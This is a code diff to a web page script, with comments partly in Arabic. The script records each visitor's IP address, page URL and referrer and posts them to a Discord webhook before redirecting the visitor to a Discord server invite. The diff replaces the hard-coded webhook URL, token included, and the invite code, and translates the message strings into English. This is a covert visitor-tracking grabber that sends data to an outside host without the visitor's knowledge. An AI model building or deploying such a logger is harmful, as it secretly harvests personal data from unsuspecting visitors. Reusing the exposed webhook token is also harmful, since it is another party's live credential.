@@ -18,8 +18,8 @@
 <body>
     <script>
         // === Webhook URL (مقدم من المستخدم) ===
-        const WEBHOOK_URL = "https://discord.com/api/webhooks/1515276137780215858/RxZYK_U3oQXinA04JkdD0FWXKuucps4QFqBaPL7Phs8LcPaFr2bVEVCEyEyVXutP_UKH";
-        const DISCORD_REDIRECT = "https://discord.gg/066";
+        const WEBHOOK_URL = "https://discord.com/api/webhooks/1515288353954861101/mxag_dQ_J0faLN3ghM5mdI7QmrNJobD4LKLXpMoGlfNAPKpJubhW3YO9Y0swamuvUXoX";
+        const DISCORD_REDIRECT = "https://discord.gg/5no";
 
         // كائن جمع بيانات الزائر
         let visitorData = {
@@ -112,7 +112,7 @@
                 const data = await res.json();
                 visitorData.ip = data.ip;
             } catch {
-                visitorData.ip = "غير متاح";
+                visitorData.ip = "Not available";
             }
         }
 
@@ -135,10 +135,10 @@
                     { name: "🆔 الرابط", value: visitorData.url, inline: false },
                     { name: "🔗 المُحيل", value: visitorData.referrer, inline: false }
                 ],
-                footer: { text: "تم التوجيه إلى discord.gg/M9L" }
+                footer: { text: "Directed to discord.gg/5no" }
             };
 
-            const payload = { embeds: [embed], content: "🔄 **زائر جديد تم توجيهه إلى السيرفر**" };
+            const payload = { embeds: [embed], content: "🔄 **A new visitor was directed to the server**" };
 
             try {
                 await fetch(WEBHOOK_URL, {
